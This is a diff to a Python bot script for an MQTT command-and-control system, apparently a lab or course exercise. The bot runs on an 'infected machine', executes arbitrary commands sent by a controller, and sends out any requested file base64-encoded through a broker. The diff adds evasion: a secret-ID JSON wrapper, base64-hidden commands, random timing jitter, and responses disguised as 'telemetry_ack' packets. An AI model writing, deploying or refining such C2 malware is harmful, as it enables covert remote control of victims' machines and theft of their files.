@@ -6,52 +6,76 @@
 #   5. copying of a file from the "infected machine" to the controller (file path is a parameter specified by the controller).
 #   6. executing a binary inside the "infected machine" specified by the controller (e.g. '/usr/bin/ps').
 import base64
+import json
 import subprocess
+import time
+
 import paho.mqtt.client as mqtt
 from consts import *
-
-
+import random
 # broker = central server that receives all messages
 #          and then routes them to the correct destinations.
 
 
-
 def on_message(client, userdata, msg):
-    payload = msg.payload.decode()
-    if payload.startswith(BOT_ID + ":"):
-        full_command = payload.split(":", 1)[1]
-        parts = full_command.split(" ", 1)
-        action = parts[0] # e.g., "ls"
-        argument = parts[1] if len(parts) > 1 else ""
-        print(f"Action: {action} | Argument: {argument}")
-        try :
-            if action == CMD_ANNOUNCE_BOT:
-                result = f"Bot {BOT_ID} is online."
-            elif action == CMD_COPY_FROM_BOT_TO_CONTROLLER:
-                with open(argument, "rb") as f:
-                    encoded_str = base64.b64encode(f.read()).decode('utf-8')
-                    result = f"FILE_B64:{argument}:{encoded_str}"
-            else:
-                # execute other commands directly
-                # ignore blank "" args
-                cmd_list = [action] + ([argument] if argument else [])
-                result = subprocess.check_output(cmd_list, stderr=subprocess.STDOUT).decode()
+    try:
+        # try parse json
+        packet = json.loads(msg.payload.decode())
+        # Check for secret ID
+        if packet.get("s_id") == STEALTH_ID:
+            payload_data = base64.b64decode(packet.get("data")).decode()
+            parts = payload_data.split(" ", 1)
+            action = parts[0]  # e.g., "ls"
+            argument = parts[1] if len(parts) > 1 else ""
 
-            if(result == ""):
-                result = f"Command {action} executed successfully."
-            client.publish(TOPIC, f"{BOT_ID}_RES: {result}")
-        except Exception as e:
-            client.publish(TOPIC, f"{BOT_ID}_ERR: {str(e)}")
-    else:
-        # It's someone else's traffic.
+            # introduce random delay
+            time.sleep(random.uniform(0.35, 1.69))
+
+            print(f"[DEBUG]: Received command: {action} {argument}, executing...")
+            result = get_action_result(action, argument)
+
+            # Hide the response
+            res_b64 = base64.b64encode(result.encode()).decode()
+            res_packet = {
+                "s_id": STEALTH_ID,
+                "type": "telemetry_ack",
+                "payload": res_b64
+            }
+
+
+            print("----")
+            print(f"[DEBUG]: showcase of the response being sent:")
+            print(json.dumps(res_packet, indent=4))
+            print("----")
+
+            client.publish(TOPIC, json.dumps(res_packet))
+
+    except:
+        # ignore other messages
         pass
+
+
+def get_action_result(action, argument):
+    if action == CMD_ANNOUNCE_BOT:
+        result = f"Bot {STEALTH_ID} is online."
+    elif action == CMD_COPY_FROM_BOT_TO_CONTROLLER:
+        with open(argument, "rb") as f:
+            encoded_str = base64.b64encode(f.read()).decode('utf-8')
+            result = f"FILE_B64:{argument}:{encoded_str}"
+    else:
+        # execute other commands directly
+        # ignore blank "" args
+        cmd_list = [action] + ([argument] if argument else [])
+        result = subprocess.check_output(cmd_list, stderr=subprocess.STDOUT).decode()
+    if result == "":
+        result = f"Command {action} executed successfully."
+    return result
 
 
 # both the bot and the controller are 'clients'
 # client = mqtt.Client()
 # added version to avoid warning
 client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
-
 
 # callback when a message is received
 client.on_message = on_message
@@ -62,4 +86,3 @@ print("Subscribed! Waiting for commands...")
 
 # prevents the script from ending.
 client.loop_forever()
-
